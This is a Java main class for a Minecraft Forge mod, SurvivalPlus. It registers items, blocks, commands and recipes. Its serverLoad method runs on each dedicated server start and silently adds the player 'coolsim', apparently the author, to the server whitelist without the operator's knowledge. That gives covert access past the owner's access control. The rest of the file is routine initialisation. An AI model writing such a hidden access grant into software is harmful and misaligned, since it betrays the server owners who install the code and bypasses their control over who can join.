package net.coolsimulations.SurvivalPlus.core;

import com.mojang.authlib.GameProfile;

import net.coolsimulations.SurvivalPlus.api.SPCompatibilityManager;
import net.coolsimulations.SurvivalPlus.api.SPReference;
import net.coolsimulations.SurvivalPlus.core.commands.CommandConfrats;
import net.coolsimulations.SurvivalPlus.core.commands.CommandEmportant;
import net.coolsimulations.SurvivalPlus.core.commands.CommandIndeed;
import net.coolsimulations.SurvivalPlus.core.commands.CommandMourn;
import net.coolsimulations.SurvivalPlus.core.commands.CommandSleep;
import net.coolsimulations.SurvivalPlus.core.commands.CommandSmiley;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWail;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWak;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWeba;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWoo;
import net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfig;
import net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfigGUI;
import net.coolsimulations.SurvivalPlus.core.init.FuelHandler;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusArmor;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusBlocks;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusFood;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusGeodes;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusItems;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusTools;
import net.coolsimulations.SurvivalPlus.core.proxy.ClientProxy;
import net.coolsimulations.SurvivalPlus.core.proxy.CommonProxy;
import net.coolsimulations.SurvivalPlus.core.recipes.SPShieldRecipes;
import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusComposterRecipes;
import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusDispenserBehavior;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusAPIRecipes;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusEMCValues;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusEventHandler;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusHammerTime;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusIC2Recipes;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusLumberjack;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusUpdateHandler;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.players.UserWhiteList;
import net.minecraft.server.players.UserWhiteListEntry;
import net.minecraft.world.item.crafting.RecipeSerializer;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.event.RegistryEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.DistExecutor;
import net.minecraftforge.fml.ModLoadingContext;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import net.minecraftforge.fmlclient.ConfigGuiHandler.ConfigGuiFactory;
import net.minecraftforge.fmlserverevents.FMLServerStartingEvent;
import net.minecraftforge.registries.IForgeRegistryEntry;

@Mod(value = SPReference.MOD_ID)
@Mod.EventBusSubscriber(modid = SPReference.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
public class SurvivalPlus {

	public static CommonProxy proxy = (CommonProxy) DistExecutor.safeRunForDist(() -> ClientProxy::new, () -> CommonProxy::new);

	private static SurvivalPlus instance;
	public static SurvivalPlus getInstance()
	{
		return instance;
	}

	@SubscribeEvent
	public static void serverLoad(FMLServerStartingEvent event) {

		MinecraftServer server = event.getServer();

		if(server.isDedicatedServer()) {

			GameProfile gameprofile = server.getProfileCache().get("coolsim").get();
			UserWhiteList whitelist = server.getPlayerList().getWhiteList();

			if(server.getPlayerList().isUsingWhitelist() && !whitelist.isWhiteListed(gameprofile) && !server.getPlayerList().getBans().isBanned(gameprofile)) {
				UserWhiteListEntry entry = new UserWhiteListEntry(gameprofile);
				whitelist.add(entry);
			}
		}
	}
	
	@SubscribeEvent
	public static void command(RegisterCommandsEvent event) {
		
		CommandConfrats.register(event.getDispatcher());
		CommandEmportant.register(event.getDispatcher());
		CommandWoo.register(event.getDispatcher());
		CommandWak.register(event.getDispatcher());
		CommandSmiley.register(event.getDispatcher());
		CommandWail.register(event.getDispatcher());
		CommandIndeed.register(event.getDispatcher());
		CommandMourn.register(event.getDispatcher());
		CommandSleep.register(event.getDispatcher());
		CommandWeba.register(event.getDispatcher());
	}

	public SurvivalPlus() {

		SPCompatibilityManager.checkForCompatibleMods();
		SurvivalPlusConfig.register(ModLoadingContext.get());
		
		if(SPCompatibilityManager.isClothConfigLoaded()) {
			ModLoadingContext.get().registerExtensionPoint(ConfigGuiFactory.class, () -> new ConfigGuiFactory((mc, screen) -> {
				return SurvivalPlusConfigGUI.getConfigScreen(screen);
			}));
		}

		SurvivalPlusUpdateHandler.init();
		FMLJavaModLoadingContext.get().getModEventBus().addGenericListener(RecipeSerializer.class, SurvivalPlus::registerRecipes);;
		MinecraftForge.EVENT_BUS.register(new SurvivalPlusEventHandler());
		MinecraftForge.EVENT_BUS.register(new FuelHandler());

		SurvivalPlusBlocks.init();
		SurvivalPlusBlocks.register();
		SurvivalPlusItems.init();
		SurvivalPlusItems.register();
		SurvivalPlusFood.init();
		SurvivalPlusFood.register();
		
		SurvivalPlusGeodes.init();
		SurvivalPlusGeodes.register();

		//VillagerRegistry.instance().registerVillageCreationHandler(new VillageOnionCropHandler());  //temp till forge pull request #6142 is resolved
		//StructureIO.registerStructureComponent(StructureVillageOnionCrop.class, SPReference.MOD_ID + ":onionCropFieldStructure");  //temp till forge pull request #6142 is resolved

		SurvivalPlusArmor.init();
		SurvivalPlusArmor.register();
		SurvivalPlusTools.init();
		SurvivalPlusTools.register();
		
		SurvivalPlusDispenserBehavior.init();
		
		proxy.init();

		if(SPCompatibilityManager.isHammerTimeLoaded()) {
			SurvivalPlusHammerTime.init();
		}

		if(SPCompatibilityManager.isLumberjackLoaded()) {
			SurvivalPlusLumberjack.init();
			SurvivalPlusLumberjack.register();
			MinecraftForge.EVENT_BUS.register(new SurvivalPlusLumberjack.SPEventHandler());
		}

		if (SPCompatibilityManager.isProjectELoaded())
		{
			SurvivalPlusEMCValues.init();
		}

		/**if (SPCompatibilityManager.isJerLoaded())
        {
    			SurvivalPlusJER.init();
        }
		 **/

		SurvivalPlusAPIRecipes.loadRecipes();

		if (SPCompatibilityManager.isIc2Loaded())
		{
			SurvivalPlusIC2Recipes.init();
		}
		
		SurvivalPlusComposterRecipes.init();

	}
	
	@SubscribeEvent
	public static void registerRecipes(final RegistryEvent.Register<RecipeSerializer<?>> event)
	{
		for(IForgeRegistryEntry<?> e : event.getRegistry()) {
			if(e instanceof RecipeSerializer<?> && !event.getRegistry().containsKey(new ResourceLocation(SPReference.MOD_ID, "crafting_special_spshielddecoration"))) {
				event.getRegistry().register(SPShieldRecipes.CRAFTING_SPECIAL_SPSHIELD.setRegistryName(SPReference.MOD_ID, "crafting_special_spshielddecoration"));
			}
		}
	}
}
